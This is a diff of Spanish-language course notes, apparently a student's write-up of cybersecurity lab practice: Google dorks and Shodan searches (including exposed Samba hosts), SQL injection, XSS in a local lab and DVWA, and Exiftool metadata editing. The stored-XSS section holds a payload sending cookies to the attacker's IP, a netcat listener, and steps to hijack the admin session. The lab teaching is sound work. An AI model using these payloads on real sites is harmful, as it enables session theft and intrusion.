@@ -4,7 +4,7 @@
 
 Debido a la gran cantidad de practicas que se realizan en los cursos de Openwebinars, y que algunas de esas herramientas ya han sido vistas durante el modulo de seguridad de ASIR, no voy a realizar videos de todo lo que se ve en la carrera de ciberseguridad porque daría para muchos videos.
 
-Por lo tanto lo que he realizado son tres videos en donde se realizan practicas de aquellos temas que he visto mas interesante, han sido repetidos en varios de los cursos de seguridad y no han sido vistos en el modulo de seguridad.
+Por lo tanto lo que he realizado son algunos videos en donde se realizan practicas de aquellos temas que he visto mas interesante, han sido repetidos en varios de los cursos de seguridad y no han sido vistos en el modulo de seguridad.
 
 ## Google hacking y Shodan
 
@@ -63,12 +63,14 @@ Ejemplos de operadores lógicos:
 - title (nos buscara por cabeceras)
 - os (nos buscara por sistema operativo)
 
-Algunos de los ejemplos que veremos sera ver dispositivos en españa con _country:es_, podemos concretar con el operador _city_ una ciudad en concreto, seleccionaremos alguno para ver toda la información que nos da shodan, también realizaremos un consulta a equipos de España que tengan Samba buscando el puerto 445 con _country:es port:445_, y por ultimo buscaremos cámaras web de android.
+Algunos de los ejemplos que veremos sera ver dispositivos en españa con _country:es_, podemos concretar con el operador _city_ una ciudad en concreto, seleccionaremos alguno para ver toda la información que nos da shodan, también realizaremos un consulta a equipos de Rusia que tengan Samba buscando el puerto 445 con _country:ru port:445_, y por ultimo buscaremos cámaras web de android.
 
 Uno de los problemas de esta practica es que cuando realizas muchos Dorks  en Goolge, es posible que te salte la típica advertencia para comprobar si eres un bots.
 Con Shodan para poder realizar las búsquedas lo primero que debes hacer es registrarte, y al igual que google tiene un determinado numero de consultas por día como se podrá ver en el video donde nos dará un error en una de las consultas, por ello se ha de esperar 24 horas asta poder realizar de nuevo consultas, por eso el otro video mas corto es solo de consultas shodan. 
 
 ### Segundo video
+
+Este video es sobre las consultas en el servidor Shodan debido a que en el primero salto el error de no poder realizar mas consultas en ese día.
 
 ## SQL Injection
 
@@ -146,7 +148,7 @@ https://hashes.com/en7decrypt/hash
 
 ### Primer Video
 
-En este tercer video se realizara una de las practicas realizadas en uno de los cursos de seguridad sobre ataques con __XSS__ este  es un ataque dirigido a páginas web y consistente en
+En este video se realizara una de las practicas realizadas en uno de los cursos de seguridad sobre ataques con __XSS__ este  es un ataque dirigido a páginas web y consistente en
 poder inyectar código HTML y Javascript sin que sea validado para conseguir algún provecho.
 
 Este vector de ataque es usado para robar:
@@ -242,7 +244,9 @@ La forma saber si es vulnerable a XSS, será realizando la comprobación a trav�
 ~~~
 http://localhost/xss3/xss.php?vuln=<SCRIPT>alert(5);</SCRIPT>
 ~~~
-En la segunda parte del video se realizara las practicas en el entorno web DVWA, donde se realizara una prueba persistente.
+### Segundo Video de XSS
+
+En esta segunda parte del video se realizara las practicas en el entorno web DVWA, donde se realizara una prueba persistente.
 XSS Persistente (Stored)
 El XSS persistente, como su propio nombre indica, permanecerá en la página donde se haya insertado el código y cada vez que se acceda a la misma se ejecutará dicho código.
 Este ejemplo es como un libro de firmas en el que se puede poner el nombre y el mensaje que se quiere dejar en el libro de firmas.
@@ -253,4 +257,38 @@ Message: <script>new Image().src="http://ip de nuestro equipo:puerto que queramo
 ~~~
 Será necesario levantar un servicio a la escucha por si llega información de alguien que entre (nc -lvp puerto definido en el script) por ejemplo, en la propia máquina Kali DVWA y que desde otro equipo se acceda con la cuenta del administrador.
 
-Si se accede a través de alguna herramienta de __CookieManager__ y se cambia la cookie, al actualizar se habrá robado la sesión del Administrador.
+Si se accede a través de alguna herramienta de __CookieManager__ y se cambia la cookie, al actualizar el home de DVWA se habrá robado la sesión del Administrador.
+
+## Exiftool
+
+### Datos Exif
+
+Los datos Exif son los datos de los datos, que quiere decir esto, por ejemplo, tenemos una imagen en formato .jpg de la cual sabemos que es una imagen por el formato, eso es información del archivo ahora los datos exif en esa imagen serían, la cámara con la que se hizo, si tenia o no el flash activado, el formato, el tamaño, la fecha en que fue creada los formatos de colores, etc .
+
+### Herramienta Exiftool
+
+Exiftool es una herramienta de extracción y edición de metadatos de casi cualquier archivo, ya sean estos de texto, software o imágenes existen muchas herramientas enfocadas a la edición y lectura de los metadatos, lo podemos usar desde la terminal (cmd) o con entorno grafico para tener un entorno de la herramienta mas amigable y fácil de usar.
+Podemos instalar Exiftool en dispositiov _Debian, Ubuntu, Mint, Kali_ con el siguiente comando:
+~~~
+ sudo apt install libimage-exiftool-perl
+~~~
+
+En este video se vera los metadatos que contienen dos imagenes una en _.CR2 y la otra en .JPG_. Para ello tan solo deberemos exribir __exiftool__ y luego el nombre de la imagen.
+
+Despues se le introducira un nombre de Artista con el comando:
+~~~
+exiftool -P -Artist=”nombre que nosotros queramos” -overwrite_original nombre_de_la_imagen.jpg
+~~~
+
+Y comprobaremos como efectivamente se ha introducido dicho dato.
+
+Luego introduciremos coordenadas GPS como la latitud y la longitud, al hacer esto se creara un Backup de la imagen original.
+Y comprobaremos si se han introducido los datos de gps.
+
+Para introducir estos datos usaremos el comando:
+~~~
+exiftool -exif:gpslatitude=”38.951206600” nombre_imagen.jpg -exi:gpslatituderef=S -exif:gpslongitude=”-77.151290800”
+~~~
+
+Evidentemente los datos de la longitud y latitud son de ejmplo se pueden introducir los que uno quiera.
+
